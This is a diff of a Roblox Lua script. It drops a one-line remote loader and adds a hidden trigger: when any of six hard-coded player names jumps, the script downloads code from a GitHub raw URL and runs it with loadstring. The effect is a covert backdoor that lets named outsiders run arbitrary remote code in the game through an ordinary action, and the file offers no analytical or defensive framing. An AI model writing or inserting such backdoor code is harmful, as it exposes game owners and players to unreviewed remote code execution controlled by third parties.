@@ -1,1 +1,81 @@
- loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/refs/heads/main/controller%20hehehe!"))()
+local Players = game:GetService("Players")
+
+local allowed = {
+	["project_2kit"] = true,
+	["bakonbits54"] = true,
+	["sharksinthewater"] = true,
+	["theonerulerofgravity"] = true,
+	["koolguy1234513"] = true, 
+	["animatedupload"] = true
+}
+
+local function safeLoad(url)
+	local source = game:HttpGet(url)
+	local func = loadstring(source)
+	if func then
+		func()
+	end
+end
+
+-- ONLY "Test"
+local function runCommand()
+	safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/Test")
+end
+
+local function setupCharacter(plr, char)
+	local humanoid = char:WaitForChild("Humanoid")
+
+	local jumpCount = 0
+	local lastJumpTime = 0
+	local windowTime = 2 -- time allowed between jumps
+
+	humanoid.StateChanged:Connect(function(_, newState)
+		if newState == Enum.HumanoidStateType.Jumping then
+			local now = tick()
+
+			-- debounce
+			if now - lastJumpTime < 0.2 then
+				return
+			end
+
+			-- reset if too slow
+			if now - lastJumpTime > windowTime then
+				jumpCount = 0
+			end
+
+			lastJumpTime = now
+			jumpCount += 1
+
+			-- Reset if exceeding 6
+			if jumpCount > 6 then
+				jumpCount = 0
+				return
+			end
+
+			-- Run Test on jumps 1–6
+			runCommand()
+		end
+	end)
+end
+
+local function hookPlayer(plr)
+	if not allowed[string.lower(plr.Name)] then
+		return
+	end
+
+	plr.CharacterAdded:Connect(function(char)
+		setupCharacter(plr, char)
+	end)
+
+	if plr.Character then
+		setupCharacter(plr, plr.Character)
+	end
+end
+
+-- Existing players
+for _, plr in ipairs(Players:GetPlayers()) do
+	hookPlayer(plr)
+end
+
+-- New players
+Players.PlayerAdded:Connect(hookPlayer)
